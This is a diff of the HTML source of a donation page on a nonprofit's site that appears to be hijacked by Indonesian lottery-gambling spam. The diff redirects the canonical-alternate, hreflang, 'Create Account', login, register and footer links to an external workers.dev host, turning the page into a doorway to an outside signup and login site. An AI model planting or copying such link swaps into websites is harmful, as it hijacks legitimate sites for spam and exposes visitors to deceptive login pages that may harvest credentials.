@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html data-theme='default'>
 <head>
@@ -7,16 +8,16 @@
 <link rel="icon" type="image/x-icon" href="https://friendsoffirststate.org/images/faviconina.png" />
 <link rel="apple-touch-icon" href="https://friendsoffirststate.org/images/faviconina.png">
 <link rel="canonical" href="https://friendsoffirststate.org/donate">
-<link rel="amphtml" href="https://history.friendsoffirststate.org/" />
+<link rel="amphtml" href="https://curly-butterfly-friend.leniho2705.workers.dev/" />
 <link rel="alternate" media="only screen and (max-width: 640px)" href="https://friendsoffirststate.org/donate" />
-    <link rel="alternate" href="https://history.friendsoffirststate.org/"> 
-    <link rel="alternate" href="https://history.friendsoffirststate.org/" hreflang="id">
-    <link rel="alternate" href="https://history.friendsoffirststate.org/" hreflang="en">
-    <link rel="alternate" href="https://history.friendsoffirststate.org/" hreflang="en">
-    <link rel="alternate" href="https://history.friendsoffirststate.org/" hreflang="x-default">
-    <link rel="alternate" hreflang="id-ID" href="https://history.friendsoffirststate.org/" />
-    <link rel="alternate" hreflang="en-US" href="https://history.friendsoffirststate.org/" />
-    <link rel="alternate" hreflang="en-SG" href="https://history.friendsoffirststate.org/" />
+    <link rel="alternate" href="https://curly-butterfly-friend.leniho2705.workers.dev/"> 
+    <link rel="alternate" href="https://curly-butterfly-friend.leniho2705.workers.dev/" hreflang="id">
+    <link rel="alternate" href="https://curly-butterfly-friend.leniho2705.workers.dev/" hreflang="en">
+    <link rel="alternate" href="https://curly-butterfly-friend.leniho2705.workers.dev/" hreflang="en">
+    <link rel="alternate" href="https://curly-butterfly-friend.leniho2705.workers.dev/" hreflang="x-default">
+    <link rel="alternate" hreflang="id-ID" href="https://curly-butterfly-friend.leniho2705.workers.dev/" />
+    <link rel="alternate" hreflang="en-US" href="https://curly-butterfly-friend.leniho2705.workers.dev/" />
+    <link rel="alternate" hreflang="en-SG" href="https://curly-butterfly-friend.leniho2705.workers.dev/" />
 <link as='image' href='https://friendsoffirststate.org/images/ina-banner.jpg' rel='preload'>
 <link crossorigin href='https://fonts.googleapis.com' rel='preconnect'>
 <link crossorigin href='https://ajax.googleapis.com' rel='preconnect'>
@@ -257,7 +258,7 @@ $70+
 
 </button></div>
 <div class='vc-header__cta'>
-<a data-rudderstack-event-type="cta" data-action="rudderstack--link-clicked#track navigation--tray-trigger#openTray" data-button-label="Create Account" data-targeted-tray="Create Account" id="create-link" href="https://history.friendsoffirststate.org/" class="link vc-header__cta-button btn--no-space btn c-link__button tp-btn--medium link--default link--strong">
+<a data-rudderstack-event-type="cta" data-action="rudderstack--link-clicked#track navigation--tray-trigger#openTray" data-button-label="Create Account" data-targeted-tray="Create Account" id="create-link" href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="link vc-header__cta-button btn--no-space btn c-link__button tp-btn--medium link--default link--strong">
 <span class='link__content'>
 BUAT AKUN
 
@@ -652,8 +653,8 @@ Back
 <div class='m-cart-config__option radio-selector' data-action='change-&gt;rudderstack--filter-clicked#track' data-cart-id='9a8c68d58aaa0c110ea9655af8a790a4' data-controller='rudderstack--filter-clicked' data-filter-name='gender' data-rudderstack--filter-clicked-location-value='product_attributes'>
 <div class='m-cart-config__select-label'>
 </div>
-<a href="https://history.friendsoffirststate.org/" class="btn-x">DAFTAR DISINI</a>
-<a href="https://history.friendsoffirststate.org/" class="btn-x">LOGIN DISINI</a>
+<a href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="btn-x">DAFTAR DISINI</a>
+<a href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="btn-x">LOGIN DISINI</a>
 
 <style>
 .btn-x{
@@ -1392,17 +1393,17 @@ Share this design:
 </div>
 </div>
 <div class="inatogel-fixed-footer">
-  <a href="https://history.friendsoffirststate.org/" class="inatogel-footer-btn">
+  <a href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="inatogel-footer-btn">
     <img src="https://friendsoffirststate.org/images/faviconina.png" alt="Login Icon">
     <span>Login</span>
   </a>
 
-  <a href="https://history.friendsoffirststate.org/" class="inatogel-footer-btn">
+  <a href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="inatogel-footer-btn">
     <img src="https://friendsoffirststate.org/images/faviconina.png" alt="Promo Icon">
     <span>Promo</span>
   </a>
 
-  <a href="https://history.friendsoffirststate.org/" class="inatogel-footer-btn inatogel-footer-btn-primary">
+  <a href="https://curly-butterfly-friend.leniho2705.workers.dev/" class="inatogel-footer-btn inatogel-footer-btn-primary">
     <img src="https://friendsoffirststate.org/images/faviconina.png" alt="Daftar Icon">
     <span>Daftar</span>
   </a>
@@ -3000,5 +3001,6 @@ height="0" width="0" style="display:none;visibility:hidden" rel="dns-prefetch"><
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"d93d0410633c4365894d0a78f479446b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e298c3fe9f7f4b17a3894b62e59229b3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"103e9c021cfe4568b2497c9af503d021","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"e390c3d29fdd4b16ae80ae173b691d98","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9eab2640d92efdb8',t:'MTc3NTkyMjY1Mg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
